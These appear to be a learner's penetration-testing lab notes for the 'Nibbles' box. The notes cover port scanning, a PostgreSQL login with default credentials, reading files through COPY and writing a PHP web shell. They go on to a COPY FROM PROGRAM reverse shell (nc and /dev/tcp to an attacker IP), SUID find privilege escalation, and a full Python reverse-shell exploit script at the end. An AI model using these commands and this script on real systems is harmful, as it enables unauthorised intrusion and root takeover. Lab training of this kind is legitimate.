# NMAP

```
sudo nmap -p- -sC -sV 192.168.236.47  -oN nmap-nibbles
```

![[PG/Linux/attachments/Pasted image 20250710192504.png]]
- Postgres
- FTP
- 22
- 80
- 445 - closed
- 139 - closed 

# FTP 

![[PG/Linux/attachments/Pasted image 20250710192633.png]]
- nope

# Web (80)

![[PG/Linux/attachments/Pasted image 20250710192805.png]]
- website link doesn't work 

![[PG/Linux/attachments/Pasted image 20250710193008.png]]
- another page
- all template
- no links work

And a picture
![[PG/Linux/attachments/Pasted image 20250710193135.png]]
## Ferox 

```
feroxbuster -u http://192.168.236.47/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out
```

Seems like that's all ferox found too

![[PG/Linux/attachments/Pasted image 20250710193208.png]]
- going to rerun with -x php,txt just in case

```
feroxbuster -u http://192.168.236.47/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -o ferox.out
```


# SMB (just in case)

```
nxc smb 192.168.236.47 -u 'root' -p 'root' --shares
```

nope 

![[PG/Linux/attachments/Pasted image 20250710193502.png]]


# Postgres

"Default" creds are the username postgres and password is nothing so trying that out
```
psql -h 192.168.236.47 -p 5437 -U 'postgres' -w
```


![[PG/Linux/attachments/Pasted image 20250710193847.png]]
- nope

Trying with -W flag to prompt for pass and just hit enter to supply nothing

```
psql -h 192.168.236.47 -p 5437 -U 'postgres' -W
```

![[PG/Linux/attachments/Pasted image 20250710193936.png]]
- nope

Trying with user `postgres` and password `postgres`

![[PG/Linux/attachments/Pasted image 20250710194035.png]]
- this worked!

Get the syntax for postgres with
```
\?
```


![[PG/Linux/attachments/Pasted image 20250710194230.png]]

list databases 
```
\l
```

Here we have some databases 

![[PG/Linux/attachments/Pasted image 20250710194350.png]]
- postgres, template0, and template1

I think templates are website nothings so will start with postgres

Select database
```
\c postgres;
```

![[PG/Linux/attachments/Pasted image 20250710194541.png]]

Show tables 
```
\d
```

then
```
\dt+
```

then 
```
\dt
```

![[PG/Linux/attachments/Pasted image 20250710194739.png]]
- nothing

Try to connect to template 0, but doesn't work
```
\c template0;
```

![[PG/Linux/attachments/Pasted image 20250710194848.png]]

Connecting to template1 did work though 

```
\c template1;
```

![[PG/Linux/attachments/Pasted image 20250710195000.png]]

Show tables
```
\d
```

![[PG/Linux/attachments/Pasted image 20250710195038.png]]
Nothing. Okay so no info in the databases but maybe info somewhere else?

Googling some guides on attacking postgres/enumeration

https://medium.com/@lordhorcrux_/ultimate-guide-postgresql-pentesting-989055d5551e

```
select usename, passwd from pg_shadow;
```

![[PG/Linux/attachments/Pasted image 20250710195338.png]]
- just me

Good info 

![[PG/Linux/attachments/Pasted image 20250710195424.png]]

Reading /etc/passwd 

```
create table hack(file TEXT);  
COPY hack FROM '/etc/passwd';  
select * from hack;
```

![[PG/Linux/attachments/Pasted image 20250710195700.png]]
username: `wilson`

**Putting a file on the PostgreSQL Server**

a cheeky php shell
```
create table hack2(put TEXT);  
INSERT INTO hack2(put) VALUES('<?php @system("$_GET[cmd]");?>');  
COPY hack2(put) TO '/tmp/temp.php';
```

Can I access this from the site? - will check soon

I probably can if I can figure out the web root of the site?

Here are some default locations for apache web root so will try to put the php shell here
![[PG/Linux/attachments/Pasted image 20250710200333.png]]

```
create table shell(put TEXT);  
INSERT INTO shell(put) VALUES('<?php @system("$_GET[cmd]");?>');  
COPY shell(put) TO '/var/www/html/temp.php';
```

![[PG/Linux/attachments/Pasted image 20250710200630.png]]
- I got permission denied

![[PG/Linux/attachments/Pasted image 20250710200735.png]]

Well web shell may not be the path, but maybe I can put an ssh key in wilson's home folder 

# Metasploit 

```
use exploit/linux/postgres/postgres_payload
```
![[PG/Linux/attachments/Pasted image 20250710210055.png]]

![[PG/Linux/attachments/Pasted image 20250710210201.png]]
- this didn't work
- probably bc arch is off?

Maybe I can generate a payload with msfvenom and put it in tmp?

Found[ this blog](https://medium.com/@netscylla/postgres-hacking-part-2-code-execution-687d24ad2082)  which linked to a [more detailed blog](https://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt) 

List postgres directories 

```
select pg_ls_dir('./');
```


Grabbing a hint.. look back at postgres version 11.7

![[PG/Linux/attachments/Pasted image 20250710211359.png]]

Google searching for “postgresql reverse shell 11.7 github” 

[Here's one ](https://github.com/squid22/PostgreSQL_RCE)

![[PG/Linux/attachments/Pasted image 20250710211600.png]]

Download the python file. 

Modify the variables.

![[PG/Linux/attachments/Pasted image 20250710211858.png]]

Set up penelope listener 

```
penelope 80
```


Run the exploit 

```
python3 postgres_rce.py
```

![[PG/Linux/attachments/Pasted image 20250710212108.png]]

:(

I fat fingered my IP address.

rev shell

```
'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.152 4444 >/tmp/f'
```

```
COPY cmd_exec FROM PROGRAM \'' + 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.152 4444 >/tmp/f'  + '\'
```

```
SELECT * from cmd_exec
```

Okay, so chatgpt and I had a heart to heart and unfucked this exploit code. 

Finally got a rev shell
![[PG/Linux/attachments/Pasted image 20250710215717.png]]

Now for a TTY

UGH

![[PG/Linux/attachments/Pasted image 20250710215833.png]]

```
/bin/sh -i
```

Closer...

![[PG/Linux/attachments/Pasted image 20250710220117.png]]

Perfect

![[PG/Linux/attachments/Pasted image 20250710220237.png]]

Def restricted to these directories

postgres@nibbles:/var/lib/postgresql$

Suddenly my password doesn't work?

```
sudo -l
```
![[PG/Linux/attachments/Pasted image 20250710220532.png]]
I know I have a wilson user so 

```
grep -ir wilson
```
![[PG/Linux/attachments/Pasted image 20250710220722.png]]
- binary files not ideal


Search for SUID binaries, run the command below.

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

![[PG/Linux/attachments/Pasted image 20250710221136.png]]
- yayyy

GTFO Bins time

![[PG/Linux/attachments/Pasted image 20250710221211.png]]

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```
![[PG/Linux/attachments/Pasted image 20250710221424.png]]

And we're root :)

![[PG/Linux/attachments/Pasted image 20250710221604.png]]

Then got wilson's flag 

![[PG/Linux/attachments/Pasted image 20250710221705.png]]


### This was the file exploit code 

```
#!/usr/bin/env python3
import psycopg2
import traceback

RHOST = '192.168.236.47'
RPORT = 5437
LHOST = '192.168.45.152'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    try:
        cur = conn.cursor()
        print("[!] Connected to the PostgreSQL database")
        rev_shell = (f"bash -c 'exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done'")
        safe_payload = rev_shell.replace("'", "''")  # escape quotes
        print(f"[*] Executing the payload. Please check if you got a reverse shell!\n")
        cur.execute('DROP TABLE IF EXISTS cmd_exec')
        cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
        cur.execute(f"COPY cmd_exec FROM PROGRAM '{safe_payload}'")
        cur.execute('SELECT * from cmd_exec')
        v = cur.fetchall()
        print(v)
        cur.close()

    except Exception as e:
        print(f"[!] Something went wrong: {e}")
        traceback.print_exc()

```